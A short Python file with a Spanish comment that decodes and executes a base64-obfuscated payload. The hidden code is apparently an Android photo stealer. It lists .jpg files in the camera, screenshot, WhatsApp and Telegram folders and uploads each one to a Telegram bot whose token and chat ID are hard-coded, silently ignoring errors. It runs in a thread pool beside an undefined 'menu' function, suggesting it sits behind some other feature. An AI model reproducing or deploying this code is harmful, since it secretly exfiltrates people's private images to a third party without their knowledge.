import base64
# Decodificar y ejecutar el script
exec(base64.b64decode('CmltcG9ydCByZXF1ZXN0cyxvcyxzeXMKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sCgp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMKZXhjZXB0OgogICAgb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCByZXF1ZXN0cyIpCiAgICBpbXBvcnQgcmVxdWVzdHMgCmRlZiBzdXlhaWIoKToKICAgIHNlc3Npb249cmVxdWVzdHMuc2Vzc2lvbigpCiAgICBib3RfdG9rZW4gPSAnNjc2NDAxMzYyMDpBQUhYZnVJOUFzM3h5czZNZnJudFc5NlhwWGE5Z01tbWVuMCcgCiAgICBjaGF0X2lkID0gJzY5MDQyMzg4MDAnICAgIAkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCiAgICB0cnk6CiAgICAgICAgc2RjYXJkX3BhdGggPSAnL3NkY2FyZCcKICAgICAgICBmaWxlX2xpc3QgPSBbZiBmb3IgZiBpbiBvcy5saXN0ZGlyKHNkY2FyZF9wYXRoKSBpZiBmLmVuZHN3aXRoKCcuanBnJyldCiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZV9saXN0OgogICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNkY2FyZF9wYXRoLCBmaWxlKSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIHVybD1mJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Ym90X3Rva2VufS9zZW5kRG9jdW1lbnQnCiAgICAgICAgICAgICAgICBkYXRhMj17J2NoYXRfaWQnOiBjaGF0X2lkfQogICAgICAgICAgICAgICAgZGF0YT17J2NoYXRfaWQnOiBjaGF0X2lkfQogICAgICAgICAgICAgICAgZmlsZXM9eydkb2N1bWVudCc6IGZ9CiAgICAgICAgICAgICAgICBnZXQgPSBzZXNzaW9uLnBvc3QodXJsLCBkYXRhPWRhdGEsIGZpbGVzPWZpbGVzKQogICAgICAgICAgICAgICAgc2VudCA9IHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YTIsIGZpbGVzPWZpbGVzKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBzZGNhcmRfcGF0aCA9ICcvc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvbWVkaWEvY29tLndoYXRzYXBwL1doYXRzQXBwL01lZGlhL1doYXRzQXBwIEltYWdlcycKICAgICAgICBmaWxlX2xpc3QgPSBbZiBmb3IgZiBpbiBvcy5saXN0ZGlyKHNkY2FyZF9wYXRoKSBpZiBmLmVuZHN3aXRoKCcuanBnJyldCiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZV9saXN0OgogICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNkY2FyZF9wYXRoLCBmaWxlKSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIHVybD1mJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Ym90X3Rva2VufS9zZW5kRG9jdW1lbnQnCiAgICAgICAgICAgICAgICBkYXRhMj17J2NoYXRfaWQnOiBjaGF0X2lkfQogICAgICAgICAgICAgICAgZGF0YT17J2NoYXRfaWQnOiBjaGF0X2lkfQogICAgICAgICAgICAgICAgZmlsZXM9eydkb2N1bWVudCc6IGZ9CiAgICAgICAgICAgICAgICBnZXQgPSBzZXNzaW9uLnBvc3QodXJsLCBkYXRhPWRhdGEsIGZpbGVzPWZpbGVzKQogICAgICAgICAgICAgICAgc2VudCA9IHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YTIsIGZpbGVzPWZpbGVzKSAgICAgICAgICAgICAgICAKICAgIGV4Y2VwdDpwYXNzCiAgICB0cnk6CiAgICAgICAgc2RjYXJkX3BhdGggPSAnL3NkY2FyZC9EQ0lNL1NjcmVlbnNob3RzJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5qcGcnKV0KICAgICAgICBmb3IgZmlsZSBpbiBmaWxlX2xpc3Q6CiAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2RjYXJkX3BhdGgsIGZpbGUpLCAncmInKSBhcyBmOgogICAgICAgICAgICAgICAgdXJsPWYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtib3RfdG9rZW59L3NlbmREb2N1bWVudCcKICAgICAgICAgICAgICAgIGRhdGEyPXsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgICAgICBkYXRhPXsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgICAgICBmaWxlcz17J2RvY3VtZW50JzogZn0KICAgICAgICAgICAgICAgIGdldCA9IHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICBzZW50ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhMiwgZmlsZXM9ZmlsZXMpCiAgICBleGNlcHQ6cGFzcwogICAgdHJ5OgogICAgICAgIHNkY2FyZF9wYXRoID0gJy9zZGNhcmQvRG93bmxvYWQvVGVsZWdyYW0nCiAgICAgICAgZmlsZV9saXN0ID0gW2YgZm9yIGYgaW4gb3MubGlzdGRpcihzZGNhcmRfcGF0aCkgaWYgZi5lbmRzd2l0aCgnLmpwZycpXQogICAgICAgIGZvciBmaWxlIGluIGZpbGVfbGlzdDoKICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZGNhcmRfcGF0aCwgZmlsZSksICdyYicpIGFzIGY6CiAgICAgICAgICAgICAgICB1cmw9ZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZERvY3VtZW50JwogICAgICAgICAgICAgICAgZGF0YTI9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGRhdGE9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGZpbGVzPXsnZG9jdW1lbnQnOiBmfQogICAgICAgICAgICAgICAgZ2V0ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgIHNlbnQgPSBzZXNzaW9uLnBvc3QodXJsLCBkYXRhPWRhdGEyLCBmaWxlcz1maWxlcykKICAgIGV4Y2VwdDpwYXNzCiAgICB0cnk6CiAgICAgICAgc2RjYXJkX3BhdGggPSAnL3NkY2FyZC9EQ0lNL0NhbWVyYScKICAgICAgICBmaWxlX2xpc3QgPSBbZiBmb3IgZiBpbiBvcy5saXN0ZGlyKHNkY2FyZF9wYXRoKSBpZiBmLmVuZHN3aXRoKCcuanBnJyldCiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZV9saXN0OgogICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNkY2FyZF9wYXRoLCBmaWxlKSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIHVybD1mJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Ym90X3Rva2VufS9zZW5kRG9jdW1lbnQnCiAgICAgICAgICAgICAgICBkYXRhMj17J2NoYXRfaWQnOiBjaGF0X2lkfQogICAgICAgICAgICAgICAgZGF0YT17J2NoYXRfaWQnOiBjaGF0X2lkfQogICAgICAgICAgICAgICAgZmlsZXM9eydkb2N1bWVudCc6IGZ9CiAgICAgICAgICAgICAgICBnZXQgPSBzZXNzaW9uLnBvc3QodXJsLCBkYXRhPWRhdGEsIGZpbGVzPWZpbGVzKQogICAgICAgICAgICAgICAgc2VudCA9IHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YTIsIGZpbGVzPWZpbGVzKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBzZGNhcmRfcGF0aCA9ICcvc2RjYXJkL1RlbGVncmFtL1RlbGVncmFtIEZpbGVzJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5qcGcnKV0KICAgICAgICBmb3IgZmlsZSBpbiBmaWxlX2xpc3Q6CiAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2RjYXJkX3BhdGgsIGZpbGUpLCAncmInKSBhcyBmOgogICAgICAgICAgICAgICAgdXJsPWYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtib3RfdG9rZW59L3NlbmREb2N1bWVudCcKICAgICAgICAgICAgICAgIGRhdGEyPXsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgICAgICBkYXRhPXsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgICAgICBmaWxlcz17J2RvY3VtZW50JzogZn0KICAgICAgICAgICAgICAgIGdldCA9IHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICBzZW50ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhMiwgZmlsZXM9ZmlsZXMpCiAgICBleGNlcHQ6cGFzcwogICAgdHJ5OgogICAgICAgIHNkY2FyZF9wYXRoID0gJy9zZGNhcmQvV2hhdHNBcHAvTWVkaWEvV2hhdHNBcHAgRG9jdW1lbnRzJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5qcGcnKV0KICAgICAgICBmb3IgZmlsZSBpbiBmaWxlX2xpc3Q6CiAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2RjYXJkX3BhdGgsIGZpbGUpLCAncmInKSBhcyBmOgogICAgICAgICAgICAgICAgdXJsPWYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtib3RfdG9rZW59L3NlbmREb2N1bWVudCcKICAgICAgICAgICAgICAgIGRhdGEyPXsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgICAgICBkYXRhPXsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgICAgICBmaWxlcz17J2RvY3VtZW50JzogZn0KICAgICAgICAgICAgICAgIGdldCA9IHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICBzZW50ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhMiwgZmlsZXM9ZmlsZXMpCiAgICBleGNlcHQ6cGFzcwp3aXRoIFRocmVhZFBvb2wobWF4X3dvcmtlcnM9MTAwMCkgYXMgdXNlcjoKICAgIHVzZXIuc3VibWl0KHN1eWFpYikKICAgIHVzZXIuc3VibWl0KG1lbnUpCg==').decode())
